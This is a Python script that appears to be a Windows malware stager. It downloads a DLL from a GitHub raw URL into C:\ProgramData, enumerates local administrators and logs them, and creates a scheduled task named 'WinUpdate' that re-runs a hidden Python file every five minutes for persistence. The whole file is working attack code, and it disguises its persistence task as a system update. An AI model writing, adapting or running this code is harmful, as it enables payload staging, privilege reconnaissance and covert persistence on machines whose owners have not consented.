import os
import subprocess
import urllib.request

# ═══════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════
dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/V2/TEST_Dll1.dll"
dll_path  = r"C:\ProgramData\TEST_Dll1.dll"
log_path  = r"C:\ProgramData\stage1.log"
self_py   = r"C:\ProgramData\hklib.py"
self_exe  = r"C:\ProgramData\py3\python.exe"
task_name = "WinUpdate"

# ═══════════════════════════════════════════════
# PHASE 1: DLL Staging (download only if not present)
# ═══════════════════════════════════════════════
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged to {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Download failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 2: Local Admin Enumeration (always runs)
# ═══════════════════════════════════════════════
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 3: Self-Persistence (create task only if missing)
# ═══════════════════════════════════════════════
def task_exists(name):
    """Check if a scheduled task already exists by name."""
    check = subprocess.run(
        ['schtasks', '/query', '/tn', name],
        capture_output=True, text=True
    )
    return check.returncode == 0

if task_exists(task_name):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Task '{task_name}' already exists.\n")
else:
    task_target = f'"{self_exe}" "{self_py}"'
    try:
        subprocess.run(
            ['schtasks', '/create', '/f', '/tn', task_name,
             '/tr', task_target, '/sc', 'minute', '/mo', '5'],
            check=True
        )
        with open(log_path, 'a') as f:
            f.write(f"[OK] Self-persistence established. Task '{task_name}' created.\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Task creation failed: {e}\n")
